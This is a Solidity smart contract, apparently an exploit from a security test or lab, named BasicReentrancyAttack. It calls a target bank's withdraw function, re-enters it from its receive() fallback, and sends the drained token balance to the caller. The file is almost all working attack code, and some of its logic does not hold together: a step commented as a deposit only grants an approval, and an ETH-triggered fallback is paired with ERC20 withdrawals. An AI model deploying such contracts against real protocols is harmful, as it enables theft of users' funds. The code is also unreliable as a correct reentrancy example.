// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title BasicReentrancyAttack
 * @dev Basic reentrancy attack contract that exploits vulnerable withdraw function
 */
contract BasicReentrancyAttack {
    using SafeERC20 for IERC20;
    
    IERC20 public token;
    address public vulnerableBank;
    uint256 public attackAmount;
    uint256 public stolenAmount;
    bool public attacking;
    
    event AttackStarted(uint256 amount);
    event AttackCompleted(uint256 stolenAmount);
    event ReentrancyExecuted(uint256 amount);
    
    constructor(address _token, address _bank) {
        token = IERC20(_token);
        vulnerableBank = _bank;
    }
    
    receive() external payable {
        if (attacking) {
            _executeReentrancy();
        }
    }
    
    function startAttack(uint256 amount) external {
        require(amount > 0, "Amount must be > 0");
        require(token.balanceOf(address(this)) >= amount, "Insufficient balance");
        
        attackAmount = amount;
        attacking = true;
        stolenAmount = 0;
        
        emit AttackStarted(amount);
        
        // First deposit to vulnerable bank
        token.safeApprove(vulnerableBank, amount);
        
        // Call vulnerable withdraw function
        (bool success, ) = vulnerableBank.call(
            abi.encodeWithSignature("withdraw(uint256)", amount)
        );
        
        require(success, "Withdraw call failed");
    }
    
    function _executeReentrancy() internal {
        if (stolenAmount < attackAmount * 2) { // Limit to prevent infinite loop
            // Re-enter withdraw function
            (bool success, ) = vulnerableBank.call(
                abi.encodeWithSignature("withdraw(uint256)", attackAmount)
            );
            
            if (success) {
                stolenAmount += attackAmount;
                emit ReentrancyExecuted(attackAmount);
            }
        } else {
            attacking = false;
            emit AttackCompleted(stolenAmount);
        }
    }
    
    function withdrawStolenFunds() external {
        require(!attacking, "Attack still in progress");
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.safeTransfer(msg.sender, balance);
        }
    }
    
    function getAttackStatus() external view returns (bool, uint256, uint256) {
        return (attacking, stolenAmount, attackAmount);
    }
}